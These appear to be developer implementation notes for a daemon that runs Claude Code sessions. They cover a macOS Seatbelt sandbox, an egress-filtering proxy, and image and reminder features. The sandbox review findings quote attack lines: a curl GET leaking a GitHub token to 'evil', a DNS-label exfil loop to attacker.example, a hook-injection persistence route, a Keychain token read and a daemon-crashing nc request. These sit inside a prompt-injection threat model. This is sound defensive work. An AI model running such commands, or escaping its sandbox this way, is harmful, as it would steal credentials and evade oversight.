- **#7 concurrent-edit guard**: a second session on the same `project_dir` is refused
  (`activeCwds`, kept through park, cleared on terminal).
- **#3 (allowlist footgun) left as a note** in CLAUDE.md — inert today (no allow rules), documented
  as the first thing to check if escalations ever stop firing.
- Also: `finishWithReport` shared by both runners; `supervisor.md` appends across resumes; question
  text wrapped in a neutralized `<questions>` delimiter (mirrors the M3 report path); the cancel
  signal threads into `ConfirmBridge` (+ `confirm_cancel`) to dismiss a stale notch panel.

### M4.1 — sandbox kickoff prompt (paste into a supervised Claude session)

> In this repo (`/Users/dev/Documents/Apps/Gumbo`), add an OS-level sandbox to the Claude Code
> sessions the daemon spawns. Read SPEC.md §M4.1 and CLAUDE.md's "M4 Claude-session gating" section
> first. The daemon spawns sessions in `daemon/src/agents/claude-runner.ts` via the Agent SDK
> `query()`. **Spike first:** confirm the SDK's `sandbox` option actually works on this macOS 27.0
> beta (the SDK docs mention bubblewrap on Linux and fail-closed on unsupported platforms — write a
> ~15-line throwaway `query()` script that runs a command needing filesystem/network access under
> `sandbox: { enabled: true, failIfUnavailable: true }` and confirm it's confined, before touching
> the runner). Then wire `sandbox` into the runner's query options so writes are confined to the
> session `cwd` + task workspace and outbound network is blocked by default, `failIfUnavailable:
> true` (fail closed — surface a clear message if the platform can't sandbox rather than running
> unconfined). Keep plan-mode, the PreToolUse hook, and the escalations exactly as they are — the
> sandbox layers UNDER them (deterministic containment; the policy table stays for semantic
> confirms like git push). Add a config block under `config.claude`. Daemon tests run `node --test`
> strip-only — no constructor parameter properties. Update IMPLEMENTATION_NOTES with a dated M4.1
> entry (why, not just what) and the spike result. Do not run build commands on the JS side.

### M4.1 — OS sandbox built (2026-07-16)

**Why:** the M4 policy table is semantic, not containment — a regex tokenizer can't parse a shell,
and Claude reads attacker-influenceable content. The SDK's `sandbox` option (macOS Seatbelt) makes
the filesystem/network boundary deterministic *under* the existing gates, so the policy table can
stay in the job it's good at (semantic confirms like git push) without pretending to be a wall.

**Spike PASSED on macOS 27.0 beta (Seatbelt works — the bubblewrap/fail-closed doc worry was
Linux-only).** Three throwaway `query()` probes (scratchpad `m41-spike/`), each verified on disk,
not from the model's narration:
- Bash write inside `cwd` and inside a `filesystem.allowWrite` extra dir → allowed. Bash write to
  `$HOME` → `operation not permitted` (file never created). So allowWrite is "cwd + listed paths",
  additive on a deny-by-default base, exactly what the runner needs for `~/Gumbo/tasks/<id>/`.
- Outbound `curl` → `curl: (56) CONNECT tunnel failed, response 403`. **The sandbox denies direct
  sockets and forces all egress through a local SDK-owned HTTP proxy** which 403s any domain not
  in `network.allowedDomains` — network denial is a proxy refusal, filesystem denial is an OS
  error; two different enforcement layers, both default-deny.
- **PreToolUse hook still fires and its deny wins under sandbox + 'auto'** — the M4 layering
  invariant. Sandbox is the bottom layer; hook/notch stay the top.

> ⚠️ **Correction after the review-address pass (see below): the OS sandbox governs ONLY bash
> and its child processes — NOT the CLI's own file tools (Read/Write/Edit/Grep/Glob).** An
> early probe showed Write→`$HOME` EPERM'ing and I wrongly concluded "the boundary holds for the
> CLI's own file ops." Deeper probing disproved it: with `filesystem.allowWrite` set (as the
> runner sets it), the Write TOOL writes freely to `~/Documents`, the repo, anywhere, and the
> Read TOOL reads a `credentials`-denied `.env`. The file tools run in the CLI's *own* Node
> process, outside the Seatbelt command jail; the SDK's `sandbox.filesystem`/`sandbox.credentials`
> only wrap spawned commands. This changes what M4.1 delivers — see the review-address entry.

**Fail-closed shape (from the CLI 2.1.211 internals, needed for a clear message):** with
`failIfUnavailable: true` the CLI refuses to start and emits a stream-json `result` with subtype
`error_during_execution` and `errors: ["Sandbox required but unavailable: <reason>. …"]`. The
runner matches that phrasing (`SANDBOX_MARKER`, error-text only — same discipline as the auth
marker after its review 🔴) and throws a clear "this Mac can't run the OS sandbox…" failure
instead of a cryptic subtype. Note the SDK's own doc: `failIfUnavailable` *defaults to true* when
sandbox is enabled via SDK options — we still set it explicitly from config so the intent is
visible and survives SDK default changes.

**Build:** `config.claude.sandbox` (`enabled`, `failIfUnavailable`, `allowedDomains: []`);
`sandboxSettings(taskId)` in claude-runner.ts (exported for tests) wired into `query()` options.
Decisions that matter:
- **`allowUnsandboxedCommands: false` (hardcoded, not config).** The SDK default is `true`, which
  lets the model pass `dangerouslyDisableSandbox` on any Bash call — i.e. a prompt-injected
  session could simply opt out of containment. `false` makes the CLI ignore that parameter.
- **Network default-deny, `allowedDomains` as the only opening.** Empty list → no `network` key →
  everything 403s at the proxy. **Consequence the user should know: an approved `git push` now
  fails at the egress proxy even after the notch confirm** (sandbox denies network to commands
  regardless of permission-layer approvals). If push-from-session should work, add `github.com`
  to `allowedDomains` (HTTPS remotes only — SSH won't traverse the HTTP proxy); until then the
  confirm flow still works but the push itself needs to happen outside the session.
- Tests: 102/102 (`sandboxSettings` shape, per-session copy of allowedDomains, marker regex vs
  the CLI's real strings and vs a benign report mentioning "sandbox").

**Caveats parked for later (from the CLI settings schema, not enabled):** `allowAppleEvents`
(needed for `open`/`osascript`/browser auth flows; removes code-execution isolation — leave off),
`enableWeakerNetworkIsolation` (macOS; lets Go-based CLIs like `gh`/`terraform` verify TLS through
the proxy's MITM CA, but opens a trustd exfil vector — leave off until a session actually hits it),
and `autoAllowBashIfSandboxed` (SDK default undocumented; we rely on 'auto' mode + hook, don't set
it). `enableWeakerNestedSandbox` is Linux/WSL-only — irrelevant on macOS.

### M4.1 — review-address pass (2026-07-16, /review-2 → /address, then deeper verification)

Two reviewers (Fable) returned no 🔴, two 🟡, four 🔵. Addressing W1 by actually exercising it
uncovered the real shape of the sandbox — the headline finding of this pass:

**THE containment boundary (corrected, spike-verified — this supersedes the "writes confined to
cwd+workspace" framing above):** the OS sandbox jails **bash and its child processes** —
filesystem writes (cwd + `allowWrite`), network egress (proxy 403 unless allow-listed), and
credential *reads* by commands (`cat .env` blocked). It does **not** jail the CLI's own file
tools — `Read`/`Write`/`Edit`/`MultiEdit`/`NotebookEdit`/`Grep`/`Glob` run in the CLI's unsandboxed
Node process. So the file-tool surface is governed by the **supervisor policy hook** (fires for
every tool in every mode, sandbox or not), not the sandbox:
- **File-tool WRITES outside cwd** → the pre-existing `edit-outside-cwd` escalation → notch confirm
  → deny on timeout (fail-closed). Semantic gate, not OS-deterministic, but safe.
- **File-tool access to secret paths** (`.env`, `~/.claude`) → new **hard deny** (`protectedPathHit`
  in supervisor.ts), because there's no legitimate reason and no confirm should be offered.
The two layers compose: bash side = OS sandbox, file-tool side = policy hook. Neither alone covers
the whole surface; together they do. (Evidence: 16 throwaway probes in scratchpad `m41-spike/` —
the decisive ones showed the Write tool reaching `~/Documents` and the Read tool reading a
`credentials`-denied decoy, then the hook hard-denying the same Read once wired in.)

**W1 — secret reads (🟡, FIXED, two layers).** The env-strip (`secretEnvKeys`) covers the subprocess
*environment*; the same keys live on disk in the repo `.env` (a Gumbo self-edit session has the
repo as cwd) and `~/.claude`. Fix: `secretFilePaths` in config, denied in BOTH layers — sandbox
`credentials.files` (blocks `cat .env` + child processes) AND the policy hard-deny (blocks the
Read/Grep tools the sandbox misses). The credential-deny is READ-only (`mode: 'deny'`), so it does
not block the CLI writing checkpoint backups under `~/.claude/file-history/`.

**W2 — undo/rewindFiles under sandbox (🟡, VERIFIED WORKING, no code change).** The review feared
checkpoint backups (written to `~/.claude`, outside the write boundary) would EPERM and break
`undo()`. Disproven: a full-config probe (sandbox + `credentials` deny on `~/.claude` +
`enableFileCheckpointing`) edited a file and `rewindFiles` rewound it to pre-run state. Checkpoints
are written by the CLI's own unsandboxed process, and `credentials` deny is read-only — neither
touches the backup writes. (Aside surfaced while probing: `rewindFiles` needs the *exact* user-msg
uuid as its target; the runner already captures `firstUserMessageId` from the echoed user turn, so
this is unchanged — just don't expect a null/wrong uuid to rewind.)

**S1 — SDK-semantics reliance (🔵, documented).** The SDK's `Options.sandbox` doc says filesystem
access is "configured via permission rules … not these sandbox settings" — which read as stale but
is actually *correct*: it's describing exactly the bash-vs-file-tool split above. Containment rests
on the pinned CLI (2.1.211) behaving as probed. **On SDK/CLI upgrade, re-run the `m41-spike/` probes
as a gate** (write-outside-cwd, egress, bash-read-secret, Read-tool-secret) — fail-closed only fires
when the sandbox is *unavailable*, not when it silently *widens*.

**S2 — `allowLocalBinding` (🔵, caveat).** Not set → sandboxed commands can't bind a local port. A
session that runs a dev server or a port-binding test suite (incl. Gumbo's own `npm test`, which
binds `GUMBO_PORT`) will fail with a confusing bind error, and can't reach the daemon's loopback
:8737 either (a containment plus, but a footgun for legit dev servers). Wire `allowLocalBinding`
through config only when a real task needs it.

**S3 — workspace realpath (🔵, FIXED).** `sandboxSettings` now `realpathSync`es the task workspace
(guarded on existence) so a symlinked `GUMBO_HOME` (e.g. `/tmp` → `/private/tmp` on macOS) can't
make Seatbelt's real-path matching miss it. Mirrors the manager's cwd canonicalization.

**S4 — marker→error mapping untested (🔵, acknowledged).** `SANDBOX_MARKER` regex is well-tested,
but the `run()` mapping to `CLAUDE_SANDBOX_ERROR` isn't exercised — same gap as `AUTH_MARKER`
(no `query()` fake exists; manager.test drives the manager with fake runners). Left as-is per that
precedent; fold both into a query() fake if one is ever built.

Tests: **104/104**. New: `sandboxSettings` realpath branch, `credentials` shape, and the
`protectedPathHit` hard-deny (Read/Edit/Grep of `.env`/`~/.claude`, tilde form, containing-dir
Grep, bash-unaffected, non-secret allowed).

### M4.1 — REBUILT as a whole-CLI Seatbelt wrap (2026-07-16, from the user's "run like you, with a safety net")

> ⚠️ **This supersedes the two sections above.** The SDK-`sandbox`-option approach they describe is
> GONE. The `sandbox governs bash only; the policy hook does the file tools` framing no longer
> holds — the OS sandbox now governs the file tools too.

**Why the rebuild:** the review-address pass left file-tool filesystem containment to the supervisor
policy (a *semantic* gate — escalate-outside-cwd → confirm → fail-closed-on-timeout). the user wanted
it **OS-deterministic** — "so even the cloud process tools can't escape the sandbox." A research
sub-agent (report in the transcript) confirmed the approach: the SDK `sandbox` option only jails
spawned bash (Anthropic issue #26616 "isolate all tool execution, not just Bash" — closed
not-planned; the docs say file tools are out of `/sandbox` scope). The only way to OS-confine the
CLI's own file tools is to run the **whole CLI process** under macOS Seatbelt. Anthropic's own
`@anthropic-ai/sandbox-runtime` does exactly this; we hand-roll it to avoid a beta dependency (and
the permission classifier blocked auto-adopting an un-vetted package for the security boundary).

**How:** `spawnClaudeCodeProcess` (the SDK's VM/container seam) launches the CLI as
`sandbox-exec -p <SBPL profile> <cli> <args>`. macOS forbids **nesting** a second sandbox inside the
first (`sandbox_apply` → EPERM, even for a strictly-tighter inner profile — confirmed), so this
**REPLACES** the SDK `sandbox` option rather than layering under it. Verified end-to-end with the
shipped `buildSandboxProfile` (16+ probes, `m41-spike/`): the **Write/Edit/Read tools EPERM** outside
the boundary and on secrets, bash is confined the same way, auth (Keychain) works, and
undo/`rewindFiles` still works (checkpoints under `~/.claude`, which stays writable).

**Design philosophy — a safety net, not a cage (the user).** The headless session should run like an
interactive one (any CLI, MCP, package install, research on any host) but be unable to escape its
task. So the profile is `(allow default)` **minus** two subtractions:
- **Writes** confined to the project cwd + task workspace + the runtime/cache dirs tools need
  (`~/.claude`, `$TMPDIR`, `~/.npm`, `~/.cache`, `~/Library/Caches`). The user's Documents, other
  projects, dotfiles, and system stay unwritable — can't clobber anything outside the task.
- **Secret reads** denied: `.env` (repo provider keys), `~/.ssh`, `~/.aws`. Reads are otherwise
  open, so the agent can read libs/docs/source for research.

**Network — OPEN (the user's explicit call, asked directly).** A single Seatbelt layer can't allow the
CLI's egress while denying bash's without an out-of-sandbox filtering proxy, and an allowlist would
limit research/docs (arbitrary hosts) — defeating "run like you." I built and verified a zero-dep
loopback filtering proxy (deny-all-direct + allowlist via a CONNECT proxy — it worked: CLI auth
through it, direct sockets EPERM'd, non-allowlisted hosts 403'd), but the user chose **open** for
capability parity. The exfil net is therefore: **secrets are unreadable** (little to leak) + the
supervisor policy **still escalates network-SENDS** (curl -d / POST / wget --post / git push →
notch confirm, fail-closed). Residual (accepted): a plain GET could leak non-secret data.

**Capability wiring (the user wanted parity with an interactive session):**
- **CLIs** the user has work directly — the sandbox allows read+exec of any binary and network is
  open. `firecrawl` uses its **own stored auth** (`~/Library/Application Support/firecrawl-cli`,
  readable under the sandbox) — so the daemon's least-privilege env-strip stays intact (no provider
  key injected into the session env). `git`/`node`/etc. verified runnable.
- **Context7 MCP** wired explicitly (`config.claude.mcpServers`, `type:'http'`,
  `https://mcp.context7.com/mcp`) — headless sessions don't inherit claude.ai connectors. It's
  **added on top** of the `~/.claude` MCPs the session inherits (verified at init: playwright, exa,
  claude.ai Tavily all present alongside context7). Package installs work (`~/.npm` writable).

**Fail-closed** is now our own pre-spawn check (`sandboxUnavailableReason`): non-macOS or missing
`/usr/bin/sandbox-exec` → the runner throws `CLAUDE_SANDBOX_ERROR` before the session starts, rather
than running unconfined. (The old SDK-emitted `SANDBOX_MARKER` result string is gone with the SDK
sandbox.)

**Belt-and-suspenders retained:** the supervisor policy's `protectedPathHit` hard-deny and
edit-outside-cwd escalation stay — now redundant with the OS layer for `.env`, but they give a clean
"blocked: protected secret path" message instead of a raw EPERM and cover the Read tool on
`~/.claude` (which the OS layer intentionally leaves readable so the CLI can read its own state).

Tests: **102/102** (replaced the SDK-`sandboxSettings`/`SANDBOX_MARKER` tests with
`buildSandboxProfile` shape + `sandboxUnavailableReason`).

**Open follow-up:** if the user later wants OS-level network default-deny back, the loopback filtering
proxy is the way (proven in `m41-spike/proxy-verify.mjs`) — or adopt `@anthropic-ai/sandbox-runtime`
which bundles it. Left out now by his capability-first choice.

#### Review-2 (2 Fable agents) + address — filesystem holes tightened (2026-07-16)

The rebuild got a 2-agent /review-2. No bugs in the wrap itself (writes confined, fail-closed real,
spawn/IPC/kill sound — SBPL is last-match-wins, so deny-before-allow works), but **both agents
corroborated two reachable filesystem-containment holes** the "safety net" was supposed to close.
Both fixed; both respect the open-network choice (reads/writes only):

- **🔴 Writable `~/.claude` → unsandboxed RCE + persistence.** The profile made `~/.claude` writable
  (checkpoints need it), but it also holds `settings.json`/`hooks`/`plugins`/`agents`/`skills`/
  `commands`/`CLAUDE.md` — which execute in the user's *next interactive* session, OUTSIDE this
  sandbox. `protectedPathHit` hard-denies the file TOOLS on `~/.claude` but skips Bash, and the OS
  sandbox allowed the write — so a bash `>> ~/.claude/settings.json` could drop a `SessionStart`
  command hook (no `ESCALATE_BASH` match → auto-allowed) that runs unsandboxed later. **Fix:** re-deny
  those exec surfaces *after* the `~/.claude` allow (last-match-wins, verified: `settings.json` write
  BLOCKED while `file-history` stays writable → checkpointing/undo still work), and drop the
  `~/.claude.json` write-allow (MCP/trust-injection surface).
- **🔴 Readable credential dotfiles → token exfil over the open net.** Only `.env`/`.ssh`/`.aws` were
  read-denied; `~/.config/gh` (a live GitHub OAuth token, present on this machine), `~/.npmrc`,
  `~/.netrc`, `~/.docker/config.json`, `~/.kube`, `~/.gnupg`, `~/.config/gcloud` stayed readable → a
  bash `curl "http://evil/?d=$(base64 < ~/.config/gh/hosts.yml)"` — a **GET**, so the network-SEND
  escalation (POST-only) misses it — leaks a bearer credential. **Fix:** extend `readDenied` (verified:
  gh DENIED at the sandbox level, `package.json` still readable). This makes the "secrets unreadable"
  exfil-net claim actually true for on-disk credential *files*.
- **🟡s:** custom-spawn stderr `'pipe'` was never drained (SDK only drains its own spawn) → backpressure
  deadlock risk → `'inherit'`; a config flip to `failIfUnavailable:false` on an unsupported platform
  would silently run UNSANDBOXED → now emits a `claude.sandbox {unconfined:true}` audit event; empty
  `cwd`/`taskId` would emit `(subpath "")` and re-open all writes → guard throws; the now-inverted
  "sandbox governs only bash" comments (supervisor.ts/config.ts/tests) corrected — the OS layer covers
  the file tools too now, so `protectedPathHit` stays as belt-and-suspenders (clean message + the one
  `~/.claude`-read case the OS layer intentionally leaves open). Profile ordering + credential/exec-
  surface denies are now asserted in tests. 103/103.

**Residual, stated honestly (only the network-deny proxy closes it — accepted under the user's
open-network choice):** the CLI itself must read `~/.claude` (its transcripts, config) and the
macOS **Keychain** (the claude.ai OAuth token — subscription auth), and `allow default` grants both
to bash too. So a prompt-injected session can still `cat ~/.claude/projects/**` (other sessions'
history) or `security find-generic-password …` (the OAuth token) and GET-exfil them. This can't be
closed while keeping the session working *and* the network open in a single Seatbelt layer — it needs
the loopback filtering proxy (network default-deny) from `m41-spike/proxy-verify.mjs`. Flagged for
the user; left as his capability-first call. The *fixable* credential surfaces (repo `.env`, gh/npm/
cloud tokens, ssh/aws/gnupg) ARE now closed.

### M4.1 — egress filtering proxy: network flipped OPEN → default-deny+allowlist+escalate (2026-07-16)

the user's follow-up call after seeing the residual above: **close the GET-exfil channel** by routing
ALL session egress through a loopback filtering proxy, without turning the sandbox back into a
capability cage. So it's a *generous* allowlist + **escalate-on-unknown** (a notch confirm), not a
hard 403 — the filesystem "safety net, not a cage" pattern applied to the network.

- **`daemon/src/agents/egress-proxy.ts`** — a `127.0.0.1:0` CONNECT proxy. Allowlisted host → tunnel
  (`net.connect` upstream, pipe both ways); UNKNOWN host → `onUnknown(host)` (the runner routes it to
  `Supervisor.escalateHost` → the same notch confirm as git-push, deny-on-timeout). Decisions are
  **memoized per session** (a host is prompted at most once; concurrent connects share one in-flight
  promise). Robust socket error handlers everywhere — a client RST must never crash the daemon (the
  spike learning: attach `clientSock.on('error')` FIRST). Plain HTTP (non-CONNECT) → 405.
- **Why a proxy at all / why it can split CLI-vs-bash egress when Seatbelt can't:** a single Seatbelt
  layer can only allow-or-deny network by IP, not by "who's asking" — it can't allow the CLI's
  Anthropic egress while denying bash's. The proxy runs UNSANDBOXED in the daemon and is the one
  choke point: the profile denies every direct socket and re-allows ONLY `localhost:<proxyPort>`, so
  the CLI *and* any bash it spawns are forced through `HTTPS_PROXY`, where per-host filtering happens.
- **Profile network rules** (`buildSandboxProfile(cwd, taskId, proxyPort)`, last-match-wins after
  `allow default`): `(deny network*)` → `(allow network-outbound (remote ip "localhost:<port>"))` →
  `(allow network-bind (local ip "localhost:*"))` → `(allow network-outbound (remote unix-socket))`.
  **No DNS rule needed** — the confined process only ever connects to loopback; the *proxy* resolves
  the real host upstream (verified: works with network otherwise fully denied). unix-socket egress is
  allowed for local IPC.
- **Allowlist = base + config-MCP + the user's extras.** `EGRESS_BASE_ALLOWLIST` (Anthropic/claude.ai,
  the inherited `mcp.exa.ai`, and common dev/registry hosts: github, npm, pypi, crates) + the hosts of
  `config.claude.mcpServers` **derived from their URLs** (so a changed MCP URL can't drift out of the
  allowlist) + `config.claude.sandbox.allowedDomains`. MCP hosts are pre-allowlisted deliberately — a
  headless confirm-timeout would otherwise break an MCP.
- **Fail-closed** twice: sandbox-unavailable throws (unchanged), and a proxy that won't bind throws
  `CLAUDE_PROXY_ERROR` before spawn — no session runs with unfiltered network. Proxy lifetime = the
  session's; closed in `run()`'s `finally`.
- **Verified live against the SHIPPED code** (`m41-spike/proxy-ship-verify.mjs`), not just the spike:
  (a) CLI auths THROUGH the proxy (`init:true`); (b) `curl --noproxy` direct socket → sandbox-blocked;
  (c) unlisted host (example.com), escalate→deny → proxy **403** (`CONNECT tunnel failed, response
  403`); (d) allowlisted github → tunnels; (e) `~/Documents` write still **CONFINED** (file rules
  untouched); (f) **context7 MCP connects through the proxy** — the one real unknown, RESOLVED: the
  CLI's MCP HTTP transport honors `HTTPS_PROXY` (global dispatcher), so allowlisting the MCP host is
  sufficient — no separate carve-out. Tests: 105/105 (+2 proxy tests; profile test gained network
  assertions).
- **The Keychain/transcript residual is now CLOSED for attacker-controlled hosts.** A prompt-injected
  session can still *read* `~/.claude/**` or the OAuth token, but it can no longer ship them to an
  attacker host — that host isn't allowlisted and the confirm denies on timeout headlessly. The
  supervisor's network-SEND escalation stays as the semantic layer for *approved-host* sends (git push).
- **Known follow-on:** inherited `~/.claude` MCPs the runner can't see (e.g. the claude.ai **Tavily**
  connector) aren't pre-allowlisted, so their FIRST use escalates to a confirm (interactive: approve;
  headless: denies → that MCP call fails, session continues). Add such hosts to `allowedDomains` if a
  session needs them headlessly. **Undici caveat:** MCP-over-HTTP honoring `HTTPS_PROXY` relies on the
  CLI setting a global dispatcher from env — re-verify `proxy-ship-verify.mjs` step (f) on SDK/CLI
  upgrade.

### M4.1 — egress-proxy /review-2 → /address pass (2026-07-16, 2 Fable agents)

The just-shipped proxy went through a 2-agent review (Fable debugger + Fable auditor). It found
**3 confirmed 🔴** (one was a real hole IN the proxy itself, empirically verified), plus 🟡s/🔵s —
all addressed on `main` (`affa8d9`…`6eb519e`), 116/116 tests.

- **🔴 DNS/mDNSResponder egress bypassed the proxy** — the big one. `(deny network*)` only blocks
  the process's OWN sockets; `getaddrinfo`/`dns.lookup`/`dscacheutil`/`ping` resolve via
  **`mDNSResponder`** over mach IPC, which `(allow default)` still permitted — so DNS queries left
  the sandbox WITHOUT touching the proxy. **Verified**: under the shipped profile,
  `socket.getaddrinfo('x.example')` returned a real address, so `for c in $(fold token); do
  dscacheutil -q host -a name "$c.attacker.example"; done` would exfil the Keychain token label by
  label. Fix: `(deny mach-lookup (global-name "com.apple.mDNSResponder"[.dnsproxy]))` — all name
  resolution is now forced through the proxy. **Node/Python divergence that makes this free:** Python's
  `create_connection` runs `getaddrinfo` even on a numeric IP, but Node skips the resolver when
  `isIP(host)` is truthy; the CLI reaches the proxy at literal `127.0.0.1` and delegates hostname
  resolution to the (unsandboxed) proxy via `CONNECT host:443`, so the confined side never needs
  `getaddrinfo`. Re-verified: getaddrinfo/ping now fail while the CLI auths + resolves context7 MCP
  through the proxy. Also dropped the blanket `(allow network-outbound (remote unix-socket))`
  (docker.sock-style local-bridge exposure) and the moot `network-bind` rule.
- **🔴 allowlisted CONNECT with an out-of-range port crashed the daemon** — `Number("99999")||443`
  passed validation, and on the ALLOWLISTED path `net.connect(99999,…)` throws `ERR_SOCKET_BAD_PORT`
  *synchronously*, escaping the handler (no `uncaughtException` handler → whole daemon dies). One
  `printf 'CONNECT github.com:99999…' | nc 127.0.0.1 <proxyPort>` from a session killed Gumbo. Fix:
  `parseTarget` validates port 1-65535 + non-empty host + strips IPv6 brackets → null → 403, and
  `tunnel()`'s `connect()` is try-guarded.
- **🔴 proxy bind failure crashed/hung** instead of the documented `CLAUDE_PROXY_ERROR` — the listen
  promise only resolved and there was no server `'error'` handler. Fix: reject on `'error'`, swallow
  post-listen errors.
- **🟡s:** empty-host CONNECT reached the daemon's own loopback + IPv6 brackets never matched (both
  fixed by `parseTarget`); case-sensitive memo re-prompted on case variants; inherited `NO_PROXY`
  could unroute the CLI (now cleared); proxy leaked on a pre-loop throw (profile build guarded);
  **overlapping egress confirms corrupted task status** — per-socket escalations can be pending
  concurrently and outlive the turn, so the Supervisor now depth-counts blocks (status flips only on
  0↔1) and `manager.setBlocked` won't un-park a task whose runner is gone; egress escalation errors
  now leave an audit line (were silently denied) and a deny/timeout is no longer misattributed to an
  active "the user denied".
- **🔵s:** loopback/RFC1918 IP literals hard-refused (no confirm — SSRF/pivot); distinct-host
  escalations capped (`MAX_ESCALATIONS`, bounds notch spam + the memo map); transient escalation
  errors no longer cached (re-escalatable once the supervisor recovers).
- **Documented residual (delegated egress the single OS layer still can't fully see):** DNS is now
  closed, but macOS has other out-of-process networking delegates (`nsurlsessiond` XPC, Apple-Events
  to a browser via `osascript`) that a `(deny network*)` profile can't enumerate exhaustively. The
  exfil bar is now much higher (no DNS, no direct sockets, secrets unreadable, unknown hosts escalate),
  but a determined injected session on an exotic delegate isn't provably zero. **Gate on SDK/CLI
  upgrade:** re-run `m41-spike/proxy-ship-verify.mjs` (CLI+MCP through proxy) AND `dns-fix-probe.mjs`
  (getaddrinfo blocked). New egress-proxy branches are unit-tested (approve→tunnel, forbidden literals,
  case-insensitive memo, concurrent-share, thrown-escalation re-escalate, escalation cap, plain-HTTP
  405, bind-failure fail-closed).

---

## M5 — Images + a Gumbo-owned scheduler (reminders) — 2026-07-16

### Build

- **Images:** `daemon/src/images/generate.ts` (raw fetch client, same conventions as
  tavily/exa) behind a realtime `generate_image` tool. The tool **acks instantly** — generation
  takes tens of seconds and must never block a voice turn — then the background half writes the
  PNG to `~/Gumbo/images/<id>.png`, emits `image.created` with the **filename only**, and
  speaks a brief completion. Deliberately no task/workspace (a full task is overkill for one
  API call; the event + gallery are the observability).
- **Scheduler:** `daemon/src/schedule/scheduler.ts` + a sqlite `schedule` table in the Store
  (`id, fire_at, kind, text, status, eventkit_id, created_at`) + a 20 s poll loop. On fire:
  mark fired → `reminder.fired` → deliver by speaking. `kind` is the extensibility seam
  (recurring digests, timed task spawns later) — M5 ships only `kind:'reminder'`, one-shot.
- **Announce path generalized, not duplicated:** `announceTaskFinished` was refactored into
  shared `settleConnecting` / `speakCold` / `injectLive` helpers, and M5's deliveries go
  through a new `Orchestrator.speakProactively(coldText, liveInstructions)` on the same rules —
  inject live if a session is open, else cold one-shot TTS `0x02` + (for reminders) a gold
  `notch_pulse {status:'reminder'}`; never opens a session just to speak; skips synthesis when
  no shell is connected.
- **Shell:** `Reminders/RemindersBridge.swift` — EventKit via `requestFullAccessToReminders`
  (NOT AppleScript — ~100× slower), `NSRemindersFullAccessUsageDescription` added to
  project.yml (**new TCC grant — first create_reminder prompts**; shell owns all TCC). Due-date
  components + an absolute `EKAlarm` so Reminders.app actually notifies at fire time. Notch
  pulse gained a gold 'reminder' case. Dashboard: gallery (thumbnails from `/files/images/`,
  lightbox) + reminders rail section; `/api/images` (readdir, filesystem is source of truth) +
  `/api/schedule` bootstrap, live updates from `image.created` / `reminder.*` events.

### The scheduler-vs-EventKit split (why both, recorded per the brief)

`set_reminder` writes BOTH halves because neither alone is complete:
- The **daemon poll loop** is Gumbo's spoken presence — but it only fires while the daemon
  runs. Mac asleep at fire time → it fires late, on wake; daemon off → not at all. We do not
  fight this (no launchd, no wake scheduling) — that's what EventKit is for.
- **EventKit** is the reliable OS-level delivery (Reminders.app fires even with the daemon off,
  wakes for its notification, syncs across devices) — but it can't speak as Gumbo.
So: schedule row = awareness + voice when awake; EventKit twin = durability. The shell replies
`reminder_created` with the EventKit id, stored on the row so cancel can remove the twin
(`remove_reminder`, best-effort).

### Decisions that will matter later

- **At-most-once fire:** a due row is marked `fired` BEFORE delivery. A crash mid-delivery
  loses one spoken reminder (EventKit still notified); marking after would re-fire a throwing
  row every 20 s forever. Delivery errors land as `session.error`, never unhandled.
- **No immediate sweep on boot:** the first sweep is one poll interval after `start()`. At
  daemon boot the shell hasn't reconnected yet (1.5 s retry loop), so a row that came due
  while the daemon was down would speak into a shell-less hub and be silently lost; 20 s of
  grace is nothing against the poll granularity, and EventKit already delivered on time if the
  daemon was off.
- **Late `reminder_created` after cancel:** if the shell's reply lands after the row was
  cancelled, the scheduler immediately sends `remove_reminder` with the fresh id instead of
  orphaning an entry in Reminders.app (and never adopts the id onto a cancelled row).
- **Reaper untouched:** it only reconciles the `tasks` table; a pending reminder outliving the
  daemon is the point. Unit-tested (restart reload + reap + fire).
- **Time-of-day injection:** orchestrator instructions carried only the *date* — "in 10
  minutes" needs the clock. `timeLabel()` (config.ts) joins `todayLabel()`; the daemon still
  validates fire_at is in the future (`Date.parse` of a no-offset ISO string is local time,
  which is exactly the tool's parameter contract).
- **Tool count is now 14** against SPEC §10's "≤ ~10 forgiving tools" standing risk. Routing
  held in the smoke (one turn → both `generate_image` and `set_reminder`), but watch the
  orchestrator's tool selection as the registry grows.

### Images API — verified live before building (2026-07-16)

- `gpt-image-2` exists on `/v1/images/generations` (a dated snapshot `gpt-image-2-2026-04-21`
  too). Request `{model, prompt, size}` → `data[0].b64_json`, base64 PNG (`output_format`
  defaults to png); `usage` block included. Quality param accepted (`low` verified) but left to
  the API default in the client — fewer knobs on a voice tool.
- **Sizes are free-form**: any width×height divisible by 16 (probed via the API's own
  invalid-size error — a free call). This differs from gpt-image-1's fixed size list. We still
  expose only square/landscape/portrait (1024²/1536×1024/1024×1536) — a voice model doesn't
  need a resolution picker.

### GOTCHA (worktree dev): copy `.env`, don't symlink

A symlinked worktree `.env` broke the M4.1 sandbox-profile test: `buildSandboxProfile`
realpaths `.env` (resolving the symlink to the main checkout's path) while the test asserts
the literal `secretFilePaths[0]` (the worktree path). Copy the file into worktrees instead.

### Verified (how)

- **120/120 daemon unit tests** (17 new): scheduler lifecycle (due fires once + event +
  delivery; future rows wait; restart reload with reaper no-touch; cancel incl. EventKit twin
  removal + no-fire; `create_reminder`/`reminder_created` message contract incl. the
  late-reply-after-cancel race; throwing delivery contained; real poll loop start/stop;
  list ordering), image generation (request serialization against the verified live shape;
  PNG magic bytes on disk; `image.created` carries a filename and provably not the base64;
  API-failure and empty-response paths both speak), `set_reminder` past/garbage-time guards,
  M5 tools present in the registry (Firecrawl exclusion re-asserted).
- **Full-path smoke** (real `src/index.ts` on GUMBO_PORT 8747, scratchpad GUMBO_HOME, fake
  shell WS client): the adapted demo phrase — "make me a wallpaper of a swamp at dusk, and
  remind me in 2 minutes to review it" — in ONE realtime turn produced both tool calls;
  `set_reminder` resolved "in 2 minutes" to the correct absolute local time (time-injection
  works); `create_reminder` hit the fake shell, its `reminder_created` (EK-SMOKE-1) landed on
  the row (verified via `/api/schedule`); the image arrived in 49 s — real 1536×1024 PNG on
  disk (the model picked landscape for "wallpaper" on its own), `image.created` filename-only,
  live spoken completion; the poll loop fired the due row within one interval →
  `reminder.fired` + gold `notch_pulse` + live spoken "the user, review the swamp wallpaper.";
  a second reminder timed past the session idle-close exercised the **cold** branch (73 × 0x02
  TTS frames at the fake shell + the gold pulse). Bonus: the **past-time guard recovered live** —
  the model first passed a fire_at a few seconds in the past, got the tool's "in the past —
  re-resolve" refusal, and self-corrected to a valid time on the next call. Shell builds +
